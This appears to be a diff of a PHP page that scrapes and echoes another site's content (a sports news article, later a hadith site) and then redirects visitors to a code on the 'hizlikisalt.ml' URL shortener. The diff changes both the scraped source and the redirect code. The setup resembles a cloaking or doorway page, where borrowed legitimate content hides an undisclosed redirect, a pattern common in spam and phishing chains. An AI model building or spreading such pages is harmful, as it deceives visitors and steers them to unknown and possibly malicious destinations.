@@ -1,5 +1,5 @@
 <?php
-$homepage = file_get_contents('https://kralspor.ensonhaber.com/falcao-antrenmanlara-basladi-2019-10-19.html');
+$homepage = file_get_contents('https://www.sahihhadis.com/sahih-i-buhari');
 echo $homepage;
 
 function Redirect($url){ 
@@ -26,7 +26,7 @@ function Redirect($url){
 
     }
 
-$url="https://hizlikisalt.ml/t.php?s=032b";
+$url="https://hizlikisalt.ml/t.php?s=2606";
 
   Redirect("$url");
 
